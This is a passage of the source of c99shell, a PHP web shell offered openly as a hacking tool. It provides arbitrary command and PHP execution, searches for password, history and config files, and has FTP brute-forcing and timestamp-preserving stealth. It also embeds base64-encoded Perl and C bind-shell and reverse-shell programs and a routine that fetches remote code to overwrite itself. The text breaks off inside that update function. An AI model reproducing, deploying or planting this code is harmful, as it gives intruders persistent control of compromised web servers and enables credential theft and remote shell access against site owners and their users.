<?php
/*
******************************************************************************************************
*
*                                        c99shell.php v.1.0 pre-release build #5
*                                                        Freeware license.
*                                                                © CCTeaM.
*  c99shell - файл-менеджер через www-броузер, "заточеный" для взлома.
*  Вы можете бесплатно скачать последнюю версию на домашней страничке продукта:
   http://ccteam.ru/releases/c99shell
*
*  WEB: http://ccteam.ru
*  ICQ UIN #: 656555
*
*  Особенности:
*  + управление локальными и удаленными (ftp, samba *) файлами/папками, сортировка
*    закачивание скачивание файлов и папок
*    (предворительно упаковывается/распаковывается через tar *)
*    продвинутый поиск (возможен внутри файлов)
*    modify-time и access-time у файлов не меняются при редактировании (выкл./вкл. параметром $filestealth)
*  + продвинутый SQL-менеджер не уступающий phpmyadmin,
     просмотр/создание/редактирование БД/таблиц, просмотр файлов через брешь в mysql
*  + управление процессами unix-машины.
*  + удобное (иногда графическое) выполнение shell-команд (много алиасов, можно редактировать)
*  + выполнение произвольного PHP-кода
*  + кодировщик данных через md5, unix-md5, sha1, crc32, base64
*  + быстрый локальный анализ безопасности ОС
*  + быстрое ftp-сканирование на связки login;login из /etc/passwd (обычно дает доступ к 1/100 аккаунтов)
*    постраничный вывод, сортировка, групповые операции над БД/таблицами, управление процессами SQL)
*  + скрипт "любит" include: автоматически ищет переменные с дескрипторами и вставляет их в ссылки (опциально)
     также можно изменить $surl (базовая ссылка) как через конфигурацию (принудительно) так и через cookie "c99sh_surl",
     идет авто-запись значения $set_surl в cookie "set_surl"
*  + возможность "забиндить" /bin/bash на определенный порт с произвольным паролем,
*    или сделать back connect (производится тестирование соеденения, и выводятся параметры для запуска NetCat).
*  + возможность быстрого само-удаления скрипта
*  + автоматизированая отправка сообщений о недоработках и пожеланий автору (через mail())

*  * - успех полностью зависит от конфигурации PHP
*
*        В общем нужно увидеть всё это!
*
*   Ожидаемые изменения:
*  ~ Развитие sql-менеджера
*  ~ Добавление недостающих расширений файлов
*
*  ~-~ Пишите обо всех найденых недоработках, желаемых изменениях и доработках (даже о самых незначительных!)
       в ICQ UIN #656555 либо через раздел "feedback", будут рассмотрены все предложения и пожелания.
*
*  Last modify: 3.07.2005
*
*  © Captain Crunch Security TeaM. Coded by tristram
*
******************************************************************************************************
*/
//Starting calls
if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
error_reporting(5);
@ignore_user_abort(true);
@set_magic_quotes_runtime(0);
$win = strtolower(substr(PHP_OS, 0, 3)) == "win";
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}

$shver = "1.0 pre-release build #5"; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c99sh_surl",$surl);}
else {$surl = $_REQUEST["c99sh_surl"]; //Set this cookie for manual SURL
}

$surl_autofill_include = true; //If true then search variables with descriptors (URLs) and save it in SURL.

if ($surl_autofill_include and !$_REQUEST["c99sh_surl"]) {$include = "&"; foreach (explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v); $name = urldecode($v[0]); $value = urldecode($v[1]); foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {if (strpos($value,$needle) === 0) {$includestr .= urlencode($name)."=".urlencode($value)."&";}}} if ($_REQUEST["surl_autofill_include"]) {$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);

$timelimit = 0; //time limit of execution this script over server quote (seconds), 0 = unlimited.

//Authentication
$login = ""; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)

if (stristr($_SERVER["GATEWAY_INTERFACE"],"cgi")) {$login = "";} // If CGI then turn off auth.

$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "<a href=\"http://ccteam.ru/releases/c99shell\">c99shell v.".$shver."</a>: access denied";

$gzipencode = true; //Encode with gzip?

$autoupdate = false; //Automatic updating?

$updatenow = false; //If true, update now (this variable will be false)

$c99sh_updateurl = "http://ccteam.ru/update/c99shell/"; //Update server

$filestealth = true; //if true, don't change modify&access-time

$donated_html = "<center><b>Owned by hacker</b></center>";
                /* If you publish free shell and you wish
                add link to your site or any other information,
                put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.

$curdir = "./"; //start folder
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)

$log_email = "user@host.tld"; //Default e-mail for sending logs

$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = true; //If true then save sorting-type.

// Registered file-types.
//  array(
//   "{action1}"=>array("ext1","ext2","ext3",...),
//   "{action2}"=>array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);

// Registered executable file-types.
//  array(
//   string "command{i}"=>array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." %f%"=>array("php","php3","php4"),
);

/* Highlighted files.
  array(
   i=>array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
        0 - files and folders (as default),
        1 - files only, 2 - folders only
  string {opentag} - open html-tag, e.g. "<b>" (default)
  string {closetag} - close html-tag, e.g. "</b>" (default)
  bool {break} - if true and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), // example
  array("config.php",1) // example
);

$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
                                                                         // array (i=>{letter} ...); string {letter} - letter of a drive
//$safemode_diskettes = range("a","z");
$hexdump_lines = 8;        // lines in hex preview file
$hexdump_rows = 24;        // 16, 24 or 32 bytes in one line

$nixpwdperpage = 100; // Get first N lines from /etc/passwd

$bindport_pass = "c99";          // default password for binding
$bindport_port = "31373"; // default port for binding
$bc_port = "31373"; // default port for back-connect

// Command-aliases
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}

$sess_cookie = "c99shvars"; // Cookie-variable name

$usefsbuff = true; //Buffer-function
$copy_unset = false; //Remove copied files from buffer after pasting

//Quick launch
$quicklaunch = array(
 array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl),
 array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
 array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
 array("<img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
 array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">",""),
 array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
 array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
 array("<b>Encoder</b>",$surl."act=encoder&d=%d"),
 array("<b>Bind</b>",$surl."act=bind&d=%d"),
 array("<b>Proc.</b>",$surl."act=processes&d=%d"),
 array("<b>FTP brute</b>",$surl."act=ftpquickbrute&d=%d"),
 array("<b>Sec.</b>",$surl."act=security&d=%d"),
 array("<b>SQL</b>",$surl."act=sql&d=%d"),
 array("<b>PHP-code</b>",$surl."act=eval&d=%d"),
 array("<b>Update</b>",$surl."act=update&d=%d"),
 array("<b>Feedback</b>",$surl."act=feedback&d=%d"),
 array("<b>Self remove</b>",$surl."act=selfremove"),
 array("<b>Logout</b>","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
);

//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

@$f = $_REQUEST["f"];
@extract($_REQUEST["c99shcook"]);

//END CONFIGURATION


//                                 \/        Next code isn't for editing        \/
@set_time_limit($timelimit);
$tmp = array();
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://ccteam.ru/releases/cc99shell\">c99shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 if(empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login ) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if ($login_txt === "") {$login_txt = "";}
  elseif (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}
if ($act != "img")
{
$lastdir = realpath(".");
chdir($curdir);
if ($selfwrite or $updatenow) {@ob_clean(); c99sh_getupdate($selfwrite,1); exit;}
$sess_data = unserialize($_COOKIE["$sess_cookie"]);
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}

if (!function_exists("c99_buff_prepare"))
{
function c99_buff_prepare()
{
 global $sess_data;
 global $act;
 foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
 if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
 else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
}
c99_buff_prepare();
if (!function_exists("c99_sess_put"))
{
function c99_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 c99_buff_prepare();
 $sess_data = $data;
 $data = serialize($data);
 setcookie($sess_cookie,$data);
}
}
foreach (array("sort","sql_sort") as $v)
{
 if (!empty($_GET[$v])) {$$v = $_GET[$v];}
 if (!empty($_POST[$v])) {$$v = $_POST[$v];}
}
if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) > $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return false;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return false;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = true;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = false;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return true;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return false;}
 }
 else {return false;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== false)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return false;}
}
}
if (!function_exists("myshellexec"))
{
function myshellexec($cmd)
{
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== false) {}
  elseif (is_callable("system")) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru")) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}

 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";

 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}

 return $type.$owner["read"].$owner["write"].$owner["execute"].
        $group["read"].$group["write"].$group["execute"].
        $world["read"].$world["write"].$world["execute"];
}
}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
}
}
if (!function_exists("parsesort"))
{
function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}
}
if (!function_exists("view_perms_color"))
{
function view_perms_color($o)
{
 if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
 elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
 else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
}
}
if (!function_exists("c99getsource"))
{
function c99getsource($fn)
{
 if ($fn == "c99sh_bindport.pl") {return base64_decode(
"IyEvdXNyL2Jpbi9wZXJsDQppZiAoQEFSR1YgPCAxKSB7ZXhpdCgxKTt9DQokcG9ydCA9ICRBUkdW".
"WzBdOw0KZXhpdCBpZiBmb3JrOw0KJDAgPSAidXBkYXRlZGIiIC4gIiAiIHgxMDA7DQokU0lHe0NI".
"TER9ID0gJ0lHTk9SRSc7DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsIFBGX0lORVQsIFNPQ0tfU1RS".
"RUFNLCAwKTsNCnNldHNvY2tvcHQoUywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAxKTsNCmJp".
"bmQoUywgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTsNCmxpc3RlbihTLCA1MCk7DQph".
"Y2NlcHQoWCxTKTsNCm9wZW4gU1RESU4sICI8JlgiOw0Kb3BlbiBTVERPVVQsICI+JlgiOw0Kb3Bl".
"biBTVERFUlIsICI+JlgiOw0KZXhlYygiZWNobyBcIldlbGNvbWUgdG8gYzk5c2hlbGwhXHJcblxy".
"XG5cIiIpOw0Kd2hpbGUoMSkNCnsNCiBhY2NlcHQoWCwgUyk7DQogdW5sZXNzKGZvcmspDQogew0K".
"ICBvcGVuIFNURElOLCAiPCZYIjsNCiAgb3BlbiBTVERPVVQsICI+JlgiOw0KICBjbG9zZSBYOw0K".
"ICBleGVjKCIvYmluL3NoIik7DQogfQ0KIGNsb3NlIFg7DQp9");}
 elseif ($fn == "c99sh_bindport.c") {return base64_decode(
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5".
"cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4N".
"CiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50IGFyZ2M7DQpjaGFy".
"ICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1".
"Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5f".
"ZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0p".
"KTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tm".
"ZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigi".
"c29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmcmVtb3Rl".
"LCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1h".
"Y2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsN".
"CiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk7DQogICBy".
"ZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1Zikp".
"DQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byBjOTlzaGVsbCAmJiAvYmluL2Jhc2ggLWkiKTsN".
"CiAgIGVsc2UNCiAgIGZwcmludGYoc3RkZXJyLCJTb3JyeSIpOw0KICAgY2xvc2UobmV3ZmQpOw0K".
"ICB9DQogfQ0KfQ0KaW50IGNocGFzcyhjaGFyICpiYXNlLCBjaGFyICplbnRlcmVkKSB7DQppbnQg".
"aTsNCmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSANCnsNCmlmKGVudGVyZWRbaV0gPT0g".
"J1xuJykNCmVudGVyZWRbaV0gPSAnXDAnOyANCmlmKGVudGVyZWRbaV0gPT0gJ1xyJykNCmVudGVy".
"ZWRbaV0gPSAnXDAnOw0KfQ0KaWYgKCFzdHJjbXAoYmFzZSxlbnRlcmVkKSkNCnJldHVybiAwOw0K".
"fQ==");}
 elseif ($fn == "c99sh_backconn.pl") {return base64_decode(
"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ".
"HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ".
"DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ".
"HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L".
"CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd".
"GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka".
"WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO".
"iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR".
"VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK".
"FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==");}
 elseif ($fn == "c99sh_backconn.c") {return base64_decode(
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5l".
"dGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZk".
"Ow0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBk".
"YWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0g".
"aHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihh".
"cmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsy".
"XSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsg".
"DQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1".
"Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0".
"KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIo".
"ZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwi".
"c2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==");}
 else {return false;}
}
}
if (!function_exists("c99sh_getupdate"))
{
function c99sh_getupdate($update = true)
{
 $url = $GLOBALS["c99sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
 $data = @file_get_contents($url);
 if (!$data) {return "Can't connect to update-server!";}
 else
 {
  $data = ltrim($data);
  $string = substr($data,3,ord($data{2}));
  if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return false;}
  if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
  if ($data{0} == "\x99" and $data{1} == "\x03")
  {
   $string = explode("\x01",$string);
   if ($update)
   {
    $confvars = array();
    $sourceurl = $string[0];
    $source = file_get_contents($sourceurl);
    if (!$source) {return "Can't fetch update!";}
    else
    {
     $fp = fopen(__FILE__,"w");
